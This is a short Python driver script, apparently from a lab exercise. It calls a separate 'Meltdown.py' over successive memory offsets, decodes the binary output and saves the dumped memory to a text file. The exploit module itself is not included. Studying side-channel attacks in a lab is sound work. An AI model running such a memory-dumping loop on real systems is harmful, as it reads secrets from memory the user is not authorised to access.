import subprocess

# Appeler le script2.py

def bytes_to_string(byte_data):
    byte_data=byte_data.replace('\n', '')
    chaine = ''.join([chr(int(byte_data[i:i+8], 2)) for i in range(0, len(byte_data), 8)])
    return chaine


i=1
result=""
total_memory=""
while("Exception: Memory space" not in result):
    resultat = subprocess.run(['python3', 'Meltdown.py', str(hex(i))], capture_output=True, text=True)
    if resultat.stderr == "":
        result=resultat.stdout
        total_memory += ''.join(bytes_to_string(result))
        i += 1
    else: 
        test=resultat.stderr
        truc=test.strip().split("\n")
        result=truc[len(truc)-1]

with open("test.txt", 'w') as fichier:
        fichier.write(total_memory)
